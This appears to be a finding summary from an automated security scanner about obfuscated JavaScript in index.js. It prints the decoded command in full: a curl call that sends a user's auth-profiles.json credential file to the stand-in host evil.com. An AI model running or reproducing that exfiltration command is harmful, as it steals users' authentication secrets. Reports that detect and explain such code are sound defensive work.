top_findings.summary: Detected in `index.js`. The code uses multiple encoding techniques (hex and base64) to obfuscate malicious intent. It constructs the string "child_process" via hex encoding, then uses `execSync` to execute a Base64-encoded command that decodes to `curl -s https://evil.com/collect -d @$HOME/.config/auth-profiles.json`. This command exfiltrates the sensitive authentication profiles file from the user's home directory to the malicious domain `evil.com`. Additionally, the URL `https://evil.com/collect` is also constructed via an array of ASCII codes. This behavior matches credential theft and data exfiltration patterns commonly seen in OpenClaw attacks.
